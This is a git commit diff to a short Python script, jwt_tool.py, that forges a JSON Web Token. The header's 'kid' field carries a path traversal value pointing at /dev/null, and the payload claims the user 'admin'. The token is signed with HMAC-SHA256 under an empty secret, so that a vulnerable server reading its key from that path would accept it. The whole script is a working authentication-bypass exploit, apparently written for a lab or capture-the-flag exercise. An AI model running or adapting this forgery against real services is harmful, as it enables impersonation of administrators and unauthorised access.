687b6228dc1f123481504574bbff5b22dc3acdfa
cyber-bladesmith <65616125+cyber-bladesmith@users.noreply.github.com>
2020-11-16 11:56:59 -0500

    Update jwt_tool.py

--- jwt_tool.py
+++ jwt_tool.py
@@ -5,17 +5,27 @@
 import base64
 import hmac
 import hashlib
+import json
 
-pub = open("public.pem")
-pub2 = pub.read()
+#pub = open("public.pem")
+#pub2 = pub.read()
 key = "key"
 
-token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ"
+header = {"typ":"JWT","alg":"HS256","kid":"../../../../../../../../../../dev/null"}
+payload = {"user":"admin"}
 
-signature = base64.urlsafe_b64encode(hmac.new(bytes(key, encoding='utf8'),token.encode('utf-8'), hashlib.sha256).digest()).decode('utf-8').rstrip('=')
+#token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VyIjoiYWRtaW4ifQ"
+
+token = base64.urlsafe_b64encode(bytes(json.dumps(header),encoding='utf8')).decode('utf8').rstrip("=") + "." + base64.urlsafe_b64encode(bytes(json.dumps(payload),encoding='utf8')).decode('utf8').rstrip("=")
+
+
+secret = ""
+
+signature = base64.urlsafe_b64encode(hmac.new(bytes(secret, encoding='utf8'),token.encode('utf8'), hashlib.sha256).digest()).decode('utf8').rstrip('=')
+
 
 print(token+ '.' + signature)
 
 
 
-pub.close()
+#pub.close()
